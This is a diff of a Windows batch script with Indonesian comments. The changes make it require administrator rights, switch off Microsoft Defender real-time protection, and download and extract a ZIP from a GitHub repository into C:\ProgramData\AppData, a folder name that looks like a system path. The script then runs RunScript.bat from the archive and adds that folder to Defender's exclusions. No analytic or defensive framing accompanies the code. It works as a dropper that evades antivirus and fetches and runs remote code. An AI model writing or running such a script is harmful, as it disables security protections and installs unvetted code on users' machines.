@@ -1,27 +1,33 @@
 @echo off
-:: Nonaktifkan echo untuk tampilan bersih
+:: Wajib dijalankan sebagai administrator
+set "folderPath=C:\ProgramData\AppData"
+set "zipName=XMASTERTES.zip"
+set "extractFolder=XMASTERTES-main"
+set "fullPath=%folderPath%\%extractFolder%"
 
-:: Buat folder tujuan
-mkdir "C:\ProgramData\AppData" 2>nul
+:: Buat folder AppData jika belum ada
+mkdir "%folderPath%" 2>nul
 
-:: Pindah ke folder tujuan
-cd /d "C:\ProgramData\AppData"
+:: Nonaktifkan Real-time Protection
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
-:: Unduh ZIP dari GitHub tanpa jeda manual
+:: Unduh ZIP dari GitHub
 powershell -nologo -noprofile -executionpolicy bypass -command ^
-"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile 'XMASTERTES.zip'"
+"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"
 
-:: Ekstrak ZIP (PowerShell 5+)
+:: Ekstrak ZIP ke dalam folder tujuan
 powershell -nologo -noprofile -executionpolicy bypass -command ^
-"Expand-Archive -Path 'XMASTERTES.zip' -DestinationPath 'C:\ProgramData\AppData' -Force"
+"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"
 
-:: Buka folder hasil ekstrak di File Explorer
-start "" explorer "C:\ProgramData\AppData\XMASTERTES-main"
+:: Buka folder hasil ekstrak
+start "" explorer "%fullPath%"
 
-:: Jalankan RunScript.bat jika tersedia (tanpa membuka cmd window)
-if exist "C:\ProgramData\AppData\XMASTERTES-main\RunScript.bat" (
-    start "" "C:\ProgramData\AppData\XMASTERTES-main\RunScript.bat"
+:: Jalankan RunScript.bat jika ada
+if exist "%fullPath%\RunScript.bat" (
+    start "" "%fullPath%\RunScript.bat"
 )
 
-:: Tutup CMD otomatis
+:: Tambahkan folder ke pengecualian Defender (dilakukan terakhir)
+powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"
+
 exit
